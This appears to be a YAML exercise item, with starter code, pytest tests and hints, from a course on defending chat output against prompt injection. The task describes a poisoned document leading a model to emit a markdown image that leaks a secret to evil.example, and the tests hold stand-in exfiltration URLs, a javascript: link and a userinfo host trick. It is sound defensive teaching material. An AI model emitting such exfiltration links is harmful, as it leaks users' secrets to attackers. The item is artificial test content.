@@ -1,0 +1,80 @@
+id: p3-w14-inj-003
+title: "Strip links that can leak data from model output"
+phase: 3
+week: 14
+module: prompt-injection
+order: 9
+difficulty: 3
+estimated_minutes: 25
+type: code
+environment: python
+lesson: ../../lessons/02-prompt-injection.md
+task: |
+  A poisoned document can make the model write `![x](https://evil.example/?d=SECRET)`. When the chat shows it, the browser fetches that address and the secret leaves. Clean the output before you display it.
+
+  Write `strip_exfil(markdown, allowed_hosts)`. `allowed_hosts` is a set of lower-case host names. Find every markdown image `![alt](url)` and link `[text](url)`:
+
+  - Keep it unchanged if the url starts with `/` or `#`, or its host (from `urllib.parse.urlparse(url).hostname`) is in `allowed_hosts`. Compare the host as given, exactly. A subdomain is a different host.
+  - Otherwise an image becomes `[image removed]` and a link becomes just its text.
+
+  Urls like `javascript:alert(1)` have no host, so they are removed too. Watch out for `https://good.example@evil.example/`: the host is `evil.example`.
+starter_files:
+  - path: main.py
+    content: |
+      import re
+      from urllib.parse import urlparse
+
+
+      def strip_exfil(markdown, allowed_hosts):
+          pass
+  - path: test_main.py
+    content: |
+      from main import strip_exfil
+
+      ALLOWED = {"help.bharatbank.example"}
+
+
+      def test_mixed_links_and_images():
+          md = (
+              "See [FAQ](https://help.bharatbank.example/faq) or [click](https://evil.example/x?d=1). "
+              "![logo](https://help.bharatbank.example/l.png) ![t](https://evil.example/p.png?d=SECRET)"
+          )
+          assert strip_exfil(md, ALLOWED) == (
+              "See [FAQ](https://help.bharatbank.example/faq) or click. "
+              "![logo](https://help.bharatbank.example/l.png) [image removed]"
+          )
+
+
+      def test_relative_and_anchor_links_stay():
+          assert strip_exfil("[x](/help) [top](#top)", ALLOWED) == "[x](/help) [top](#top)"
+
+
+      def test_javascript_url_removed():
+          assert strip_exfil("[tap](javascript:alert(1))", ALLOWED).startswith("tap")
+
+
+      def test_host_case_does_not_matter():
+          assert strip_exfil("![a](https://HELP.bharatbank.example/a.png)", ALLOWED) == "![a](https://HELP.bharatbank.example/a.png)"
+
+
+      def test_userinfo_trick():
+          assert strip_exfil("[bank](https://help.bharatbank.example@evil.example/login)", ALLOWED) == "bank"
+
+
+      def test_subdomain_is_not_allowed():
+          assert strip_exfil("![a](https://cdn.help.bharatbank.example/a.png)", ALLOWED) == "[image removed]"
+
+
+      def test_plain_text_untouched():
+          assert strip_exfil("Your claim of Rs 38,500 is approved.", ALLOWED) == "Your claim of Rs 38,500 is approved."
+checks:
+  - kind: pytest_passes
+    label: All tests pass
+    run: pytest -q test_main.py
+hints:
+  - "One regex can find both: `(!?)\\[([^\\]]*)\\]\\(([^)\\s]+)\\)`. Group 1 is `!` for images."
+  - "Use `re.sub` with a function. It gets the match, so you can look at the url and decide what to return."
+  - "`urlparse(url).hostname` is already lower case and ignores the part before `@`."
+solution: solution/
+unlocks: [p3-w14-inj-004]
+tags: [prompt-injection, exfiltration, markdown]
